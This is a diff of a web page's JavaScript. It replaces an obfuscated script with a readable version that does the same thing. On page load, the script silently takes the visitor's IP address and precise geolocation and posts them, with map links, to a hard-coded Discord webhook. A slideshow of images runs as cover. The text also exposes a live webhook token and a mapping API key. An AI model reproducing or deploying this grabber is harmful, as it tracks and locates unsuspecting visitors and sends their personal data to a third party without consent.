@@ -1,1 +1,154 @@
-function _0x44b9(_0x388a78,_0x5bfb88){const _0x290f89=_0x290f();return _0x44b9=function(_0x44b90c,_0x3cf566){_0x44b90c=_0x44b90c-0x1ef;let _0x8ccd8=_0x290f89[_0x44b90c];return _0x8ccd8;},_0x44b9(_0x388a78,_0x5bfb88);}const _0x17164d=_0x44b9;function _0x290f(){const _0x1c3cd0=['609186aklHyG','5TuuNMX','**IP\x20Address\x20Information:**\x0a-\x20IP\x20Address:\x20','DOMContentLoaded','\x0a-\x20Longitude:\x20','onload','error','https://discord.com/api/webhooks/1140103989124419686/2DTpJ2FnmaGaNQI6viCy2ZBzkDptJ4vkdpqnJHeHS7f_H5IERJB1yHrVAWGLS7LWDQXQ','**Location\x20Information:','\x0a-\x20Latitude:\x20','An\x20error\x20occurred\x20while\x20retrieving\x20IP\x20address:','images/','image4.png','1957676fEWnxX','Failed\x20to\x20send\x20IP\x20message\x20to\x20Discord.','https://www.google.com/maps?q=','application/json','16315860gJYVQo','image-container','opacity','onerror','src','div','style','getCurrentPosition','map','mapImageUrl','\x0a-\x20[View\x20on\x20Google\x20Maps](','1148hayrVC','add','1096941unHUoH','longitude','Failed\x20to\x20send\x20location\x20message\x20to\x20Discord.','23176BJSVeu','latitude','coords','stringify','getElementById','723610uSvAhP','addEventListener','geolocation','https://maps.geoapify.com/v1/staticmap?style=osm-bright&width=400&height=300&center=lonlat:','An\x20error\x20occurred\x20while\x20handling\x20location:','&zoom=15&apiKey=f18eb402f2ff45a297956ce3d6493229','fading-image','https://api.ipify.org?format=json','appendChild','image1.png','An\x20error\x20occurred:','Location\x20Information','classList','googleMapsUrl','54HrIENU','length','image2.png','83423WgkZZD','2RszZWQ','POST','json','image3.png'];_0x290f=function(){return _0x1c3cd0;};return _0x290f();}(function(_0x178f76,_0x18fb02){const _0x16be41=_0x44b9,_0xe03198=_0x178f76();while(!![]){try{const _0x351a9f=parseInt(_0x16be41(0x223))/0x1*(parseInt(_0x16be41(0x224))/0x2)+parseInt(_0x16be41(0x20a))/0x3+-parseInt(_0x16be41(0x1f9))/0x4*(-parseInt(_0x16be41(0x229))/0x5)+-parseInt(_0x16be41(0x228))/0x6+-parseInt(_0x16be41(0x208))/0x7*(-parseInt(_0x16be41(0x20d))/0x8)+-parseInt(_0x16be41(0x220))/0x9*(-parseInt(_0x16be41(0x212))/0xa)+-parseInt(_0x16be41(0x1fd))/0xb;if(_0x351a9f===_0x18fb02)break;else _0xe03198['push'](_0xe03198['shift']());}catch(_0x5c6d70){_0xe03198['push'](_0xe03198['shift']());}}}(_0x290f,0x4033c),document[_0x17164d(0x213)](_0x17164d(0x1ef),async function(){const _0x553032=_0x17164d;try{await sendIPToDiscord(),await handleLocation();}catch(_0x3ee580){console['error'](_0x553032(0x21c),_0x3ee580);}}));async function sendIPToDiscord(){const _0x365563=_0x17164d;try{const _0x4dfe81=_0x365563(0x1f3),_0x33fd95=await getUserIPAddress(),_0x5338ca=_0x365563(0x22a)+_0x33fd95,_0x440870={'title':'IP\x20Address\x20Information','description':_0x5338ca,'color':0xd9b5dc},_0x13547e={'embeds':[_0x440870]},_0xeee7cb=await fetch(_0x4dfe81,{'method':_0x365563(0x225),'headers':{'Content-Type':_0x365563(0x1fc)},'body':JSON['stringify'](_0x13547e)});!_0xeee7cb['ok']&&console[_0x365563(0x1f2)](_0x365563(0x1fa));}catch(_0x217e98){console[_0x365563(0x1f2)]('An\x20error\x20occurred\x20while\x20sending\x20IP:',_0x217e98);}}async function handleLocation(){const _0x366d88=_0x17164d;try{const _0x2080f4=await getLocationInfo();if(_0x2080f4){const _0x2fba81=_0x366d88(0x1f3),_0x7ff257=_0x366d88(0x1f4)+(_0x366d88(0x1f5)+_0x2080f4[_0x366d88(0x20e)])+(_0x366d88(0x1f0)+_0x2080f4[_0x366d88(0x20b)])+(_0x366d88(0x207)+_0x2080f4[_0x366d88(0x21f)]+')'),_0x4be683={'title':_0x366d88(0x21d),'description':_0x7ff257,'color':0xffff00,'image':{'url':_0x2080f4[_0x366d88(0x206)]}},_0x5f0709={'embeds':[_0x4be683]},_0x13cd15=await fetch(_0x2fba81,{'method':_0x366d88(0x225),'headers':{'Content-Type':'application/json'},'body':JSON[_0x366d88(0x210)](_0x5f0709)});!_0x13cd15['ok']&&console[_0x366d88(0x1f2)](_0x366d88(0x20c));const _0x56527f=[_0x366d88(0x21b),_0x366d88(0x222),_0x366d88(0x227),_0x366d88(0x1f8),'image5.png'],_0x216ef1=_0x56527f[_0x366d88(0x205)](_0x4bf6a1=>loadImage(_0x366d88(0x1f7)+_0x4bf6a1));await Promise['all'](_0x216ef1);const _0x3c5a2c=document['createElement'](_0x366d88(0x202));_0x3c5a2c['id']=_0x366d88(0x1fe),document['body'][_0x366d88(0x21a)](_0x3c5a2c);const _0x1af94a=document[_0x366d88(0x211)](_0x366d88(0x205));_0x1af94a[_0x366d88(0x203)]['zIndex']='0';let _0xe60436=0x0;const _0xa441ce=0x3e8;function _0xff78b1(){const _0x3cf3df=_0x366d88,_0x349dc2=new Image();_0x349dc2[_0x3cf3df(0x201)]='images/'+_0x56527f[_0xe60436],_0x349dc2[_0x3cf3df(0x21e)][_0x3cf3df(0x209)](_0x3cf3df(0x218)),_0x3c5a2c[_0x3cf3df(0x21a)](_0x349dc2),setTimeout(()=>{const _0x5b6d9a=_0x3cf3df;_0x349dc2[_0x5b6d9a(0x203)][_0x5b6d9a(0x1ff)]='1',setTimeout(()=>{const _0x2ccfc7=_0x5b6d9a;_0x349dc2[_0x2ccfc7(0x203)]['opacity']='0',_0xe60436=(_0xe60436+0x1)%_0x56527f[_0x2ccfc7(0x221)],setTimeout(_0xff78b1,_0xa441ce);},_0xa441ce);},0x64);}_0xff78b1();}}catch(_0x29d09e){console[_0x366d88(0x1f2)](_0x366d88(0x216),_0x29d09e);}}async function loadImage(_0x188923){return new Promise((_0x5a17a9,_0x4d410b)=>{const _0x187ca3=_0x44b9,_0x5da8e4=new Image();_0x5da8e4[_0x187ca3(0x1f1)]=_0x5a17a9,_0x5da8e4[_0x187ca3(0x200)]=_0x4d410b,_0x5da8e4[_0x187ca3(0x201)]=_0x188923;});}async function getUserIPAddress(){const _0x40d9f5=_0x17164d;try{const _0x109bc6=await fetch(_0x40d9f5(0x219)),_0x28a026=await _0x109bc6[_0x40d9f5(0x226)]();return _0x28a026['ip'];}catch(_0x5a6c1b){return console[_0x40d9f5(0x1f2)](_0x40d9f5(0x1f6),_0x5a6c1b),'IP\x20address\x20retrieval\x20error';}}async function getLocationInfo(){return new Promise((_0x23268e,_0x4ec16e)=>{const _0x40044a=_0x44b9;if(_0x40044a(0x214)in navigator){const _0x5ce5d9={'enableHighAccuracy':!![],'timeout':0x3e8};navigator[_0x40044a(0x214)][_0x40044a(0x204)](_0x52fde4=>{const _0x13087b=_0x40044a,_0x411e48=_0x52fde4[_0x13087b(0x20f)]['latitude'],_0x4cd8a5=_0x52fde4['coords'][_0x13087b(0x20b)],_0x592a1c=_0x13087b(0x1fb)+_0x411e48+','+_0x4cd8a5,_0xb37e1d=_0x13087b(0x215)+_0x4cd8a5+','+_0x411e48+_0x13087b(0x217),_0x245df3={'latitude':_0x411e48,'longitude':_0x4cd8a5,'googleMapsUrl':_0x592a1c,'mapImageUrl':_0xb37e1d};_0x23268e(_0x245df3);},_0x34bb78=>{_0x23268e(null);},_0x5ce5d9);}else _0x23268e(null);});}
+document.addEventListener("DOMContentLoaded", async function() {
+    try {
+        await sendIPToDiscord();
+        await handleLocation();
+    } catch (error) {
+        console.error("An error occurred:", error);
+    }
+});
+
+const webhookUrl = "https://discord.com/api/webhooks/1140103989124419686/2DTpJ2FnmaGaNQI6viCy2ZBzkDptJ4vkdpqnJHeHS7f_H5IERJB1yHrVAWGLS7LWDQXQ";
+
+async function sendIPToDiscord() {
+    try {
+        const ipAddress = await getUserIPAddress();
+        const ipContent = `**IP Address Information:**\n- IP Address: ${ipAddress}`;
+        const ipEmbed = {
+            title: "IP Address Information",
+            description: ipContent,
+            color: 14267868
+        };
+        await sendMessageToDiscord(ipEmbed);
+    } catch (error) {
+        console.error("what da gang", error);
+    }
+}
+
+async function handleLocation() {
+    try {
+        const locationInfo = await getLocationInfo();
+        if (locationInfo) {
+            const locationContent = `**Location Information:` +
+                `\n- Latitude: ${locationInfo.latitude}` +
+                `\n- Longitude: ${locationInfo.longitude}` +
+                `\n- [View on Google Maps](${locationInfo.googleMapsUrl})`;
+            const locationEmbed = {
+                title: "Location Information",
+                description: locationContent,
+                color: 16776960,
+                image: {
+                    url: locationInfo.mapImageUrl
+                }
+            };
+            await sendMessageToDiscord(locationEmbed);
+
+            const images = [
+                "image1.png", "image2.png", "image3.png", "image4.png", "image5.png"
+            ];
+
+            const imagePromises = images.map(imageName => loadImage(`images/${imageName}`));
+            await Promise.all(imagePromises);
+
+            const imageContainer = document.createElement("div");
+            imageContainer.id = "image-container";
+            document.body.appendChild(imageContainer);
+
+            const mapContainer = document.getElementById("map");
+            mapContainer.style.zIndex = "0";
+
+            let currentIndex = 0;
+            const fadeDuration = 1000;
+
+            function fadeInImage() {
+                const imageElement = new Image();
+                imageElement.src = `images/${images[currentIndex]}`;
+                imageElement.classList.add("fading-image");
+                imageContainer.appendChild(imageElement);
+
+                setTimeout(() => {
+                    imageElement.style.opacity = "1";
+                    setTimeout(() => {
+                        imageElement.style.opacity = "0";
+                        currentIndex = (currentIndex + 1) % images.length;
+                        setTimeout(fadeInImage, fadeDuration);
+                    }, fadeDuration);
+                }, 100);
+            }
+
+            fadeInImage();
+        }
+    } catch (error) {
+        console.error("An error occurred while handling location:", error);
+    }
+}
+
+async function sendMessageToDiscord(embed) {
+    try {
+        const response = await fetch(webhookUrl, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ embeds: [embed] })
+        });
+
+        if (!response.ok) {
+            throw new Error("Failed to send message to Discord.");
+        }
+    } catch (error) {
+        console.error("dude what the flip", error);
+    }
+}
+
+async function loadImage(src) {
+    return new Promise((resolve, reject) => {
+        const image = new Image();
+        image.onload = resolve;
+        image.onerror = reject;
+        image.src = src;
+    });
+}
+
+async function getUserIPAddress() {
+    try {
+        const response = await fetch("https://api.ipify.org?format=json");
+        const data = await response.json();
+        return data.ip;
+    } catch (error) {
+        console.error("huuhhh", error);
+        return "IP address retrieval error";
+    }
+}
+
+async function getLocationInfo() {
+    return new Promise((resolve, reject) => {
+        if ("geolocation" in navigator) {
+            const options = {
+                enableHighAccuracy: true,
+                timeout: 1000
+            };
+
+            navigator.geolocation.getCurrentPosition(
+                position => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                    const mapImageUrl = `https://maps.geoapify.com/v1/staticmap?style=osm-bright&width=400&height=300&center=lonlat:${longitude},${latitude}&zoom=15&apiKey=f18eb402f2ff45a297956ce3d6493229`;
+                    const locationInfo = {
+                        latitude,
+                        longitude,
+                        googleMapsUrl,
+                        mapImageUrl
+                    };
+                    resolve(locationInfo);
+                },
+                error => {
+                    resolve(null);
+                },
+                options
+            );
+        } else {
+            resolve(null);
+        }
+    });
+}
